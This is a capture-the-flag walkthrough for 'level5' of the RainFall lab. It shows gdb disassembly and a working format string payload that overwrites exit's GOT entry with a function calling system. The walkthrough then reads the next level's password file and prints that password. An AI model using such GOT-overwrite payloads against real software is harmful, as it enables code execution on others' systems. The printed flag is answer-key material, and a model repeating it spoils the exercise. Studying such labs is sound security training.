# Walkthrough level5

Here this is a format string exploitation to [override the GOT](https://medium.com/zh3r0/intro-to-pwn-protostar-format-strings-c86ca3458ad3) (Global Offset Table) with the "o" function address. GOT stores standard function addresses.
We need to locate the address where the function "exit" and "o" are located. "Exit" address is "0x8049838" and "o" address is "0x080484a4".

```bash
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
=> 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.

(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
=> 0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.


(gdb) disas o
Dump of assembler code for function o:
=> 0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

We must write "o" address "0x080484a4" at "exit" address "0x8049838". The same technique is used as in levels 3 and 4.

```bash
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/level5
level4@RainFall:~$ cat /tmp/level5 - | ./level5
(...)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' '%x08' * 2 + '%134513805d%n'" > /tmp/level5
level4@RainFall:~$ cat /tmp/level5 - | ./level5
(...)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
